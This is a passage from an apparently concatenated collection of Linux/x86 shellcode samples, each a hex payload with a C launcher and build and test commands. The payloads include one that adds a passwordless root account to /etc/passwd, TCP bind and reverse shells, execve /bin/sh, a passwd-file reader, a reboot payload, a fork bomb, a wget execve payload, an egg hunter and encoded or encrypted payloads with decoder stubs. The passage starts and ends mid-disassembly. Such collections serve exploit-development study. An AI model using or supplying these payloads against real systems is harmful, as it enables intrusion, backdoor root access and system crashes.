 8049084:    b0 06                   mov    $0x6,%al
 8049086:    cd 80                   int    $0x80
 8049088:    b0 01                   mov    $0x1,%al
 804908a:    31 db                   xor    %ebx,%ebx
 804908c:    cd 80                   int    $0x80
 
 0804908e <callfunc>:
 804908e:    e8 c3 ff ff ff          call   8049056 <func>
 8049093:    ......string.......
*/

#include <stdio.h>
#include <string.h>

char shell[]=   "\xeb\x38\x5e\x31\xc0\x88\x46\x0b\x88\x46\x2b\xc6\x46\x2a\x0a\x8d\x5e\x0c\x89\x5e\x2c\x8d\x1e"
                "\x66\xb9\x42\x04\x66\xba\xa4\x01\xb0\x05\xcd\x80\x89\xc3\x31\xd2\x8b\x4e\x2c\xb2\x1f\xb0\x04"
                "\xcd\x80\xb0\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xc3\xff\xff\xff\x2f\x65\x74\x63\x2f\x70"
                "\x61\x73\x73\x77\x64\x23\x74\x6f\x6f\x72\x3a\x3a\x30\x3a\x30\x3a\x74\x30\x30\x72\x3a\x2f\x72"
                "\x6f\x6f\x74\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x23";

main()
{
    printf("[+]shellcode length %d\n", strlen(shell));
    int *ret;
    ret = (int *)&ret + 2;
    (*ret) = (int)shell;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

 Shell Bind TCP (GetPC/Call/Ret Method) - C Language
 Linux/x86

 Written in 2013 by Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This source is licensed under the Creative Commons
 Attribution-ShareAlike 3.0 Brazil License.

 To view a copy of this license, visit

   http://creativecommons.org/licenses/by-sa/3.0/

 You are free:

    to Share - to copy, distribute and transmit the work
    to Remix - to adapt the work
    to make commercial use of the work

 Under the following conditions:
   Attribution - You must attribute the work in the manner
                 specified by the author or licensor (but
                 not in any way that suggests that they
                 endorse you or your use of the work).

   Share Alike - If you alter, transform, or build upon
                 this work, you may distribute the
                 resulting work only under the same or
                 similar license to this one.

*/

/*

 shell_bind_tcp_getpc_shellcode

 * 89 bytes
 * null-bytes free
 * uses GetPC method for fun and profit


 # gcc -m32 -fno-stack-protector -z execstack shell_bind_tcp_getpc_shellcode.c -o shell_bind_tcp_getpc_shellcode
 # ./shell_bind_tcp_getpc_shellcode

 Testing
 # nc 127.0.0.1 11111

*/


#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"\xe8\xff\xff\xff\xff\xc3\x5d\x8d\x6d\x4a\x31\xc0"
"\x99\x6a\x01\x5b\x52\x53\x6a\x02\xff\xd5\x96\x5b"
"\x52\x66\x68\x2b\x67\x66\x53\x89\xe1\x6a\x10\x51"
"\x56\xff\xd5\x43\x43\x52\x56\xff\xd5\x43\x52\x52"
"\x56\xff\xd5\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9"
"\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x52\x53\xeb\x04\x5f\x6a\x66\x58\x89"
"\xe1\xcd\x80\x57\xc3";

main ()
{

        // When the IP contains null-bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(code));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp");


	// Setting the port number (byte reverse order) and Calling the shellcode

	__asm__ ("movw $0x672b, (code+27)\n\t"
		"call code");
	
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

 Tiny Shell Bind TCP Shellcode - C Language
 Linux/x86

 Written in 2013 by Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This source is licensed under the Creative Commons
 Attribution-ShareAlike 3.0 Brazil License.

 To view a copy of this license, visit

   http://creativecommons.org/licenses/by-sa/3.0/

 You are free:

    to Share - to copy, distribute and transmit the work
    to Remix - to adapt the work
    to make commercial use of the work

 Under the following conditions:
   Attribution - You must attribute the work in the manner
                 specified by the author or licensor (but
                 not in any way that suggests that they
                 endorse you or your use of the work).

   Share Alike - If you alter, transform, or build upon
                 this work, you may distribute the
                 resulting work only under the same or
                 similar license to this one.

*/

/*

 tiny_shell_bind_tcp_shellcode

 * 73 bytes
 * null-free if the port is


 # gcc -m32 -fno-stack-protector -z execstack tiny_shell_bind_tcp_shellcode.c -o tiny_shell_bind_tcp_shellcode

 Testing
 # ./tiny_shell_bind_tcp_shellcode
 # nc 127.0.0.1 11111

*/


#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"
"\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68"
"\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1"
"\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd"
"\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f"
"\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x41\xcd\x80";

main ()
{

        // When the Port contains null bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(code));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp\n\t"

	// Setting the port
		 "movw $0x672b, (code+20)\n\t"

	// Calling the shellcode
		 "call code");

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

 Tiny Shell Bind TCP Random Port Shellcode - C Language
 Linux/x86

 Written in 2013 by Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This source is licensed under the Creative Commons
 Attribution-ShareAlike 3.0 Brazil License.

 To view a copy of this license, visit

   http://creativecommons.org/licenses/by-sa/3.0/

 You are free:

    to Share - to copy, distribute and transmit the work
    to Remix - to adapt the work
    to make commercial use of the work

 Under the following conditions:
   Attribution - You must attribute the work in the manner
                 specified by the author or licensor (but
                 not in any way that suggests that they
                 endorse you or your use of the work).

   Share Alike - If you alter, transform, or build upon
                 this work, you may distribute the
                 resulting work only under the same or
                 similar license to this one.

*/

/*

 tiny_shell_bind_tcp_random_port_shellcode

 * 57 bytes
 * null-free


 # gcc -m32 -fno-stack-protector -z execstack tiny_shell_bind_tcp_random_port_shellcode.c -o tiny_shell_bind_tcp_random_port_shellcode

 Testing
 # ./tiny_shell_bind_tcp_random_port_shellcode
 # netstat -anp | grep shell
 # nmap -sS 127.0.0.1 -p-  (It's necessary to use the TCP SYN scan option [-sS]; thus avoids that nmap connects to th$
 # nc 127.0.0.1 port

*/


#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"
"\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0"
"\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80"
"\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8"
"\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\x41\xcd\x80";

main ()
{

        // When the Port contains null bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(code));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp\n\t"

	// Calling the shellcode
		 "call code");

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

 Tiny Shell Reverse TCP Shellcode - C Language
 Linux/x86

 Written in 2013 by Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This source is licensed under the Creative Commons
 Attribution-ShareAlike 3.0 Brazil License.

 To view a copy of this license, visit

   http://creativecommons.org/licenses/by-sa/3.0/

 You are free:

    to Share - to copy, distribute and transmit the work
    to Remix - to adapt the work
    to make commercial use of the work

 Under the following conditions:
   Attribution - You must attribute the work in the manner
                 specified by the author or licensor (but
                 not in any way that suggests that they
                 endorse you or your use of the work).

   Share Alike - If you alter, transform, or build upon
                 this work, you may distribute the
                 resulting work only under the same or
                 similar license to this one.

*/

/*

 tiny_shell_reverse_tcp_shellcode

 * 67 bytes
 * null-free if the IP and port are


 # gcc -m32 -fno-stack-protector -z execstack tiny_shell_reverse_tcp_shellcode.c -o tiny_shell_reverse_tcp_shellcode

 Testing
 # nc -l 127.1.1.1 11111
 # ./tiny_shell_reverse_tcp_shellcode

*/


#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"
"\x02\x89\xe1\xcd\x80\x59\x93\xb0\x3f\xcd"
"\x80\x49\x79\xf9\xb0\x66\x68\x7f\x01\x01"
"\x01\x66\x68\x2b\x67\x66\x6a\x02\x89\xe1"
"\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b"
"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x31\xc9\xcd\x80";

main ()
{

        // When the Port contains null bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(code));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp\n\t"

	// Setting the IP
		 "movl $0x0101017f, (code+27)\n\t"

	// Setting the port
		 "movw $0x672b, (code+33)\n\t"

	// Calling the shellcode
		 "call code");

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

   Egg Hunter Shellcode - C Language - Linux/x86
   Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

/*

   egg_hunter_shellcode

   * 38 bytes
   * null-free if egg signature is

   # gcc -m32 -fno-stack-protector -z execstack egg_hunter_shellcode.c -o egg_hunter_shellcode

   Testing
   # ./egg_hunter_shellcode

*/

#include <stdio.h>
#include <string.h>

unsigned char egg[] = \

              // Write "Egg Mark" and exit

              "\x90\x50\x90\x50"   // <- First Four Bytes of Signature
              "\x90\x50\x90\x50"   // <- Same first bytes are mandatory
              "\x31\xdb"
              "\xf7\xe3\xb0\x04\x6a\x0a\x68\x4d\x61\x72"
              "\x6b\x68\x45\x67\x67\x20\xb3\x01\x89\xe1"
              "\xb2\x09\xcd\x80\xb0\x01\xcd\x80";

              unsigned char egghunter[] = \

              // Search for the Egg Signature (0x50905090 x 2) - the Egg's 8 first instructions (nop, push eax, nop, push eax...)

              "\xfc\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f"
              "\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c"
              "\xf2\x74\xee\xb8"
              "\x90\x50\x90\x50"   // <- Signature
              "\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";


main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(egghunter));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("movl $0xffffffff, %eax\n\t"
            "movl %eax, %ebx\n\t"
            "movl %eax, %ecx\n\t"
            "movl %eax, %edx\n\t"
            "movl %eax, %esi\n\t"
            "movl %eax, %edi\n\t"
            "movl %eax, %ebp\n\t"

            // Setting the egg hunter signature to search (byte reverse order)

            "movl $0x50905090, (egghunter+24)\n\t"

            // Calling the shellcode
            "call egghunter");

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

 Insertion Decoder Shellcode - C Language - Linux/x86
 Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

/*

   insertion_decoder_shellcode

  * decoder has 33 bytes (the final amount depends on the shellcode length plus garbage bytes)
  * null-free
  * decodes any pattern of garbage insertion
      Eg: True Byte = X, Garbage Byte = _
           _ X _ X _ ...
           X _ _ X X ...
           X X X _ _ ... 


   # gcc -m32 -fno-stack-protector -z execstack insertion_decoder_shellcode.c -o insertion_decoder_shellcode

   Testing
   # ./insertion_decoder_shellcode

*/


#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

// Shellcode Decoder (33 bytes)
"\xeb\x1a\x5e\x8d\x3e\x31\xc9\x8b\x1c\x0e"
"\x41\x66\x81\xfb"
"\xf1\xf1"        // <- End Signature
"\x74\x0f\x80\xfb"
"\x3f"            // <- Garbage Byte
"\x74\xf0\x88\x1f\x47\xeb\xeb\xe8\xe1\xff"
"\xff\xff"

// Encoded shellcode (length depends of the shellcode plus garbage bytes)
"\x3f\x3f\x3f\x31\x3f\xc9\x3f\xf7\xe1\x3f"
"\xb0\x0b\x3f\x51\x68\x3f\x2f\x2f\x3f\x73"
"\x68\x3f\x68\x2f\x3f\x62\x69\x3f\x6e\x89"
"\x3f\xe3\xcd\x3f\x80\xf1\xf1";


main ()
{

        // When contains null bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(shellcode));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp\n\t"

		 // Calling the shellcode
		 "call shellcode");

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

 Tiny Execve sh Shellcode - C Language - Linux/x86
 Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>

*/

/*

   tiny_execve_sh_shellcode

  * 21 bytes
  * null-free


   # gcc -m32 -fno-stack-protector -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode

   Testing
   # ./tiny_execve_sh_shellcode

*/


#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
"\x80";


main ()
{

        // When contains null bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(shellcode));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp\n\t"

		 // Calling the shellcode
		 "call shellcode");

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

 Tiny Execve sh Shellcode - C Language - Linux/x86
 Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>

*/

/*

   tiny_execve_sh_shellcode

  * 21 bytes
  * null-free


   # gcc -m32 -fno-stack-protector -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode

   Testing
   # ./tiny_execve_sh_shellcode

*/


#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
"\x80";


main ()
{

        // When contains null bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(shellcode));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp\n\t"

		 // Calling the shellcode
		 "call shellcode");

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

   Tiny Read File Shellcode - C Language - Linux/x86
   Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

/*

   tiny_read_file_shellcode

   * 51 bytes
   * null-free
   * read 4096 bytes from /etc/passwd file


   # gcc -m32 -fno-stack-protector -z execstack tiny_read_file_shellcode.c -o tiny_read_file_shellcode

   Testing
   # ./tiny_read_file_shellcode

*/


#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

              "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73"
              "\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f"
              "\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03"
              "\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92"
              "\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd"
              "\x80";


main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("movl $0xffffffff, %eax\n\t"
            "movl %eax, %ebx\n\t"
            "movl %eax, %ecx\n\t"
            "movl %eax, %edx\n\t"
            "movl %eax, %esi\n\t"
            "movl %eax, %edi\n\t"
            "movl %eax, %ebp\n\t"

            // Calling the shellcode
            "call shellcode");

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

   Mutated Reboot Shellcode - C Language - Linux/x86
   Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see &t;http://www.gnu.org/licenses/>.

*/

/*

   mutated_reboot_shellcode

   * 55 bytes
   * null-free
   * mutated isn't polymorphic (shellcode does not replicate itself to be called polymorphic)
  
  
   # gcc -m32 -fno-stack-protector -z execstack mutated_reboot_shellcode.c -o mutated_reboot_shellcode

   Testing
   * Only run it in a Virtual Machine!!! Your system will crash. Use at your own risk!
   * To work properly, you must be su!

*/


#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

              "\x29\xff\x74\x01\xe8\x83\xc7\x24\x97\xeb"
              "\x01\xe1\xcd\x80\xeb\x01\xff\x6a\x29\x59"
              "\xeb\x01\x01\xbb\x67\x45\x23\x01\xba\xca"
              "\x9b\xc2\xff\x31\xda\x75\x01\xe7\x87\xda"
              "\x8d\x41\x2f\x8d\x89\x40\x19\x12\x28\xeb"
              "\x02\xe8\x01\xcd\x80";


main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("movl $0xffffffff, %eax\n\t"
            "movl %eax, %ebx\n\t"
            "movl %eax, %ecx\n\t"
            "movl %eax, %edx\n\t"
            "movl %eax, %esi\n\t"
            "movl %eax, %edi\n\t"
            "movl %eax, %ebp\n\t"

            // Calling the shellcode
            "call shellcode");

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

   Mutated Fork Bomb Shellcode - C Language - Linux/x86
   Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

/*

   mutated_fork_bomb_shellcode

   * 15 bytes
   * null-free
   * mutated isn't polymorphic (shellcode does not replicate itself to be called polymorphic)


   # gcc -m32 -fno-stack-protector -z execstack mutated_fork_bomb_shellcode.c -o mutated_fork_bomb_shellcode

   Testing
   * Only run it in a Virtual Machine!!! Your system will crash. Use at your own risk!

*/


#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

              "\x31\xff\xeb\x01\xe8\xb2\x1d\x97\x83\xe8"
              "\x1b\xcd\x80\xeb\xf1";


main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("movl $0xffffffff, %eax\n\t"
            "movl %eax, %ebx\n\t"
            "movl %eax, %ecx\n\t"
            "movl %eax, %edx\n\t"
            "movl %eax, %esi\n\t"
            "movl %eax, %edi\n\t"
            "movl %eax, %ebp\n\t"

            // Calling the shellcode
            "call shellcode");

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

   Mutated Execve Wget Shellcode - C Language - Linux/x86
   Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

/*

   mutated_execve_wget_shellcode

   * 96 bytes
   * null-free
   * mutated isn't polymorphic (shellcode does not replicate itself to be called polymorphic)


  # gcc -m32 -fno-stack-protector -z execstack mutated_execve_wget_shellcode.c -o mutated_execve_wget_shellcode

  Testing
  # ./mutated_execve_wget_shellcode

*/


#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

              "\xeb\x01\xe8\x29\xdb\x74\x01\x83\xf7\xe3"
              "\xbd\xf5\xff\xff\xff\xeb\x01\xe8\x68\x41"
              "\x65\x45\x72\x29\xf6\x74\x01\x83\x5e\x56"
              "\x81\xf6\x25\x4a\x1f\x3e\x56\xeb\x01\x33"
              "\x68\x69\x73\x2e\x67\x89\x44\x24\x0c\x89"
              "\xe1\x6a\x74\xeb\x01\xe3\x68\x2f\x77\x67"
              "\x65\xeb\x01\x83\x68\x2f\x62\x69\x6e\xeb"
              "\x01\x33\x68\x2f\x75\x73\x72\x8d\x1c\x24"
              "\xeb\x01\x83\x50\x51\x53\x89\xe1\xf7\xdd"
              "\x95\xeb\x01\x83\xcd\x80";


main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("movl $0xffffffff, %eax\n\t"
            "movl %eax, %ebx\n\t"
            "movl %eax, %ecx\n\t"
            "movl %eax, %edx\n\t"
            "movl %eax, %esi\n\t"
            "movl %eax, %edi\n\t"
            "movl %eax, %ebp\n\t"

            // Calling the shellcode
            "call shellcode");

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

   Uzumaki Decrypter Shellcode - C Language - Linux/x86
   Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

/*

   uzumaki_decrypter_shellcode

   * decrypter has 29 bytes (the final amount depends on the shellcode length)
   * it decrypts the uzumaki cipher, a custom stream cipher algorithm ( (XOR [static] and XOR [pseudorandom]), ADD [static] )
   * to encrypt the shellcode use the Uzumaki Crypter <https://github.com/geyslan/SLAE/blob/master/7th.assignment/uzumaki_crypter.py>
   * null-free

   # gcc -m32 -fno-stack-protector -z execstack uzumaki_decrypter_shellcode.c -o uzumaki_decrypter_shellcode

   Testing
   # ./uzumaki_decrypter_shellcode

*/


#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

              // Shellcode Decrypter
              "\x29\xc9\x74\x14\x5e\xb1"
              "\x14"  // <- shellcode length
              "\x46\x8b\x06\x83\xe8"
              "\x09"  // <- ADD key
              "\x34"
              "\x9f"  // <- XOR key
              "\x32\x46\xff\x88\x06\xe2\xf1\xeb\x05\xe8"
              "\xe7\xff\xff\xff"

              // Crypted Shellcode
              "\x31\x70\xaa\x92\xd7\x2d\xce\xaf\xe1\xa8"
              "\xcc\x8d\xa8\xe1\xdb\x9d\xa1\x81\xfe\xba"
              "\xdb";


main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("movl $0xffffffff, %eax\n\t"
            "movl %eax, %ebx\n\t"
            "movl %eax, %ecx\n\t"
            "movl %eax, %edx\n\t"
            "movl %eax, %esi\n\t"
            "movl %eax, %edi\n\t"
            "movl %eax, %ebp\n\t"

            // Calling the shellcode
            "call shellcode");

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

Title   : tcpbindshell  (108 bytes)
Date    : 15 May 2013
Author  : Russell Willis <codinguy@gmail.com>
Testd on: Linux/x86 (SMP Debian 3.2.41-2 i686)

$ objdump -D tcpbindshell -M intel

tcpbindshell:     file format elf32-i386

Disassembly of section .text:

08048060 <_start>:
 8048060:   31 c0                   xor    eax,eax
 8048062:   31 db                   xor    ebx,ebx
 8048064:   31 c9                   xor    ecx,ecx
 8048066:   31 d2                   xor    edx,edx
 8048068:   b0 66                   mov    al,0x66
 804806a:   b3 01                   mov    bl,0x1
 804806c:   51                      push   ecx
 804806d:   6a 06                   push   0x6
 804806f:   6a 01                   push   0x1
 8048071:   6a 02                   push   0x2
 8048073:   89 e1                   mov    ecx,esp
 8048075:   cd 80                   int    0x80
 8048077:   89 c6                   mov    esi,eax
 8048079:   b0 66                   mov    al,0x66
 804807b:   b3 02                   mov    bl,0x2
 804807d:   52                      push   edx
 804807e:   66 68 7a 69             pushw  0x697a
 8048082:   66 53                   push   bx
